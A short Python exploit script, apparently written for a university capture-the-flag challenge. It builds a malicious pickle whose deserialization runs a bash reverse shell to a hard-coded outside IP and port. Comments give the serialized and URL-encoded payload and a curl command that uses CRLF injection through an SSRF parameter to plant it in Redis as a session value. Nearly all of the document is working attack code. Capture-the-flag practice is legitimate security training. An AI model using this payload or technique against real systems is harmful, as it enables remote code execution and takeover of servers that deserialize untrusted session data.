import pickle
import os

class hello(object):
    def __reduce__(self):
        s = """/bin/bash -c 'bash -i >& /dev/tcp/140.112.151.38/9487 0>&1'"""
        # s = '''sleep 10'''
        return (os.system, (s,))

x = pickle.dumps(hello())
print(x)

# b"\x80\x03cposix\nsystem\nq\x00X;\x00\x00\x00/bin/bash -c 'bash -i >& /dev/tcp/140.112.151.38/9487 0>&1'q\x01\x85q\x02Rq\x03."
# urlencoded: (' -> %27, & -> %26, ; -> %3b)
# b"\x80\x03cposix\nsystem\nq\x00X%3b\x00\x00\x00/bin/bash -c %27bash -i >%26 /dev/tcp/140.112.151.38/9487 0>%261%27q\x01\x85q\x02Rq\x03."
# ^^^ this is our [[payload]]

# pickle.loads(x)

# write to redis with the key "session:owooo":
# curl -kv "https://edu-ctf.csie.org:10163/" --data 'url=http://redis:6379?%0d%0aSET%20session:owooo%20[[payload]]%0d%0a:10163/foo'
